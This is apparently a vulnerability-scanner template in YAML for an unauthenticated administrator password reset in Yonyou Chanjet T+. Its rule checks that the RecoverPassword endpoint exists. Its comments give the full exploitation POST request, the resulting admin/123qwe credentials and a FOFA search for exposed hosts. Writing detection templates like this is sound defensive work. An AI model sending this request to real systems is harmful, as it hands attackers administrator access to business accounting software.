id: yonyou-chanjet-tplus-recoverpassword-passwordreset

info:
  name: 用友 畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞
  author: zan8in
  severity: high
  verified: true
  description: |
    用友 畅捷通T+ RecoverPassword.aspx 存在未授权管理员密码修改漏洞，攻击者可以通过漏洞修改管理员账号密码登录后台
    fofa: app="畅捷通-TPlus"
  tags: yonyou,chanjet,tplus,passwordreset
  created: 2025/03/13
  requires: [chanjet]
  requires-mode: opportunistic

set:
  randstr: randomLowercase(6)
rules:
  r0:
    request:
      method: GET
      path: /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx
    expression: |
      response.status == 200 &&
      response.body.bcontains(b'"pwdNew":pwdNew') &&
      response.body.bcontains(b'_RecoverPassword_class')
expression: r0()
# 利用数据包
#  POST /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd  HTTP/1.1
#  Host: ip:51
#  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
#  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
#  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
#  Accept-Encoding: gzip, deflate
#  Accept-Language: zh-CN,zh;q=0.9
#  Cookie: ASP.NET_SessionId=gp3mxvri3leqbqazlatfx5jg
#  Content-Length: 49
#
#  {
#  "pwdNew":"46f94c8de14fb36680850768ff1b7f2a"
#  }

# 重置后的系统管理员账号密码为 admin/123qwe
